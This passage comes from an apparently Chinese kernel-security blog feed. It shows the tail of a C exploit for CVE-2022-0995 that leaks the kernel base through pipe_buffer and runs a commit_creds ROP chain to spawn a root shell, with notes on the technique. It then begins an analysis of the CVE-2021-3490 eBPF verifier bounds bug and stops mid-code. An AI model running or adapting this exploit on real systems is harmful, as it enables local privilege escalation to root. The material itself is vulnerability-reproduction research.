class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span> =</span> (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr, kernel_offset, kernel_base;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (kernel_addr - <span class="number">0xffffffff8203fe40</span>);</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> push_rsi_pop_rsp_pop_4reg_ret = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span> =</span> (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain;</span><br><span class="line"></span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_cred;</span><br><span class="line">    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230821100144612.png"                      alt="image-20230821100144612"                ></p><h3 id="pipe-buffer？"><a href="#pipe-buffer？" class="headerlink" title="pipe_buffer？"></a>pipe_buffer？</h3><p>这里主要说的是 <a href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/">向pipe_buffer说yes!</a> 这篇文章中的利用手法。</p><p>不太推荐，不过需要修改一下type的值为<code>0x306</code>，如果继续保持<code>0x30a</code>的话结果是偏移<code>0x400</code>这样对于<code>pipe_buffer</code>来说过于大了，容易飞出去，所以修改到<code>0x40</code>效果更佳。(不过我不知道为什么每次申请的时候他都给我结尾为<code>0x40</code>和<code>0xc0</code>的，好像就是故意的🤮)</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230821104028747.png"                      alt="image-20230821104028747"                ></p><p>虽然我们可以达到上图，但是在后续的利用中会出现一些问题，首先就是<code>pipe</code>对于申请数量的限制，超过510个时就出现了报错，这样会使成功率大打折扣。其次就是这里是页级的UAF，正如前面的所说，申请的数量较少那么我们在后续对<code>pipe</code>修改<code>size</code>分配堆块的时候从刚刚释放的页面内分配的概率又进一步减小了。当然，面对第二个问题我们可以事先分配很多<code>object</code>用于消耗内存中的<code>slab</code>。但是第一个问题却是硬伤无法解决，所以就我看来如果遇到页级的<code>off by one/null</code>这样的漏洞需要事先配置好堆风水的情况以外都不是特别推荐使用这一方法。</p><hr><p>参考链接:</p><p>​    <a class="link"   href="https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/" >https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v5.17-rc3/source" >https://elixir.bootlin.com/linux/v5.17-rc3/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实前两天复现了一个2023的CVE，本来打算写那一个的，但是对于那个CVE更多的是做工作上的适配，在一些小细节上的原理并没有掌握得特别透彻</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="watch queue" scheme="https://cv196082.gitee.io/tags/watch-queue/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3490</title>
    <link href="https://cv196082.gitee.io/2023/08/12/CVE-2021-3490/"/>
    <id>https://cv196082.gitee.io/2023/08/12/CVE-2021-3490/</id>
    <published>2023-08-12T13:30:19.000Z</published>
    <updated>2023-08-12T13:30:19.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近为了找工作疯狂复现CVE是真的太难了😭，今天才发现我工位旁边的居然是fmyy爷😭，属于是给跪了。</p><p>这次复现的这个CVE是一个关于ebpf的漏洞，如果各位没有相关的基础可以看一下这篇文章<a href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/">CVE-2017-16995</a>，并且这次这个CVE的利用方法和以前做的一道题可以说是一摸一样，所以这次不会详细的介绍利用方法而是更倾向于解释如何构造之类的，具体的利用方法可以去看<a href="https://cv196082.gitee.io/2023/01/06/d3bpf/">d3bpf</a>。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>有过ebpf的基础都知道在载入一个ebpf程序的时候会对每条指令进行检查，而检查的函数就在<code>do_check</code>中，如果是一个ALU运算的话则会进入<code>check_alu_op</code>进行进一步检查，如果我们的运算方式是<code>and/or/xor</code>一类的则会进入<code>adjust_reg_min_max_vals</code>函数进行进一步的检查，在函数中最后会调用到<code> adjust_scalar_min_max_vals</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_SUB:</span><br><span class="line">scalar32_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MUL:</span><br><span class="line">dst_reg-&gt;var_off = tnum_mul(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_AND:</span><br><span class="line">dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_XOR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数中会根据<code>opcode</code>的不同而进入不同的分支，以and为例，其会调用<code>scalar32_min_max_and</code>和<code>scalar_min_max_and</code>计算32位以及64位的边界值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">  <span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">  s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">  u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Assuming scalar64_min_max_and will be called so its safe</span></span><br><span class="line"><span class="comment"> * to skip updating register for known 32-bit case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">  dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">  <span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">    dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">    dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先<code>tnum_subreg_is_const</code>函数得到的是当前寄存器的低32位值是否是<code>known</code>的，根据函数的流程如果两个寄存器的低32位都为<code>known</code>则直接return。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着观察这个函数，首先则是判断了64位是否为<code>known</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment"> * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment"> * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment"> * cast result into s64.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果两个寄存器都是<code>known</code>的状态的话，那么就直接会将<code>imm</code>赋值给寄存器内的多个成员。如果是这样运行的话，那么是正常的运行的。不过可以看到的是这个<code>scalar32_min_max_and</code>函数中取<code>known</code>的函数使用的是<code>tnum_subreg_is_const</code>，然而这个函数只会验证低32位的<code>mask</code>值，如果此时存在以下两个寄存器会是这样的效果。<code>R1=&#123;.value=0x1, .mask=0xffffffff00000000&#125;</code>，<code>R2=&#123;.value=0x100000002, .mask=0x0&#125;</code>如果两个寄存器进行and运算的话，那么结果就为<code>R1=&#123;.value=0x0, .mask=0x100000000&#125;</code>。此时在<code>scalar32_min_max_and</code>函数中是会直接<code>return</code>的，随后立马进入<code>scalar_min_max_and</code>函数中，并且因为<code>dst_known = 0</code>导致不会进入<code>if</code>语句，进入下面的流程。最终会进入到<code>scalar32_min_max_and</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line"> (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">__update_reg32_bounds(reg);</span><br><span class="line">__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数就是对<code>dst_reg</code>进行了两次更新边界的效果，这里主要关注32位的处理。首先将有符号的最小值赋值为有符号的最小值和真实值中的最大值，然后就是将有符号的最大值赋值为有符号的最大值和真实值中最小值。后面无符号和上述类似。</p><p>依旧按照上面的例子来看，因为在<code>scalar32_min_max_and</code>函数中并没有对32位的边界值做任何初始化所以最终的效果为最小边界值为1，最大边界值为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">reg-&gt;smin_value = (s64)imm;</span><br><span 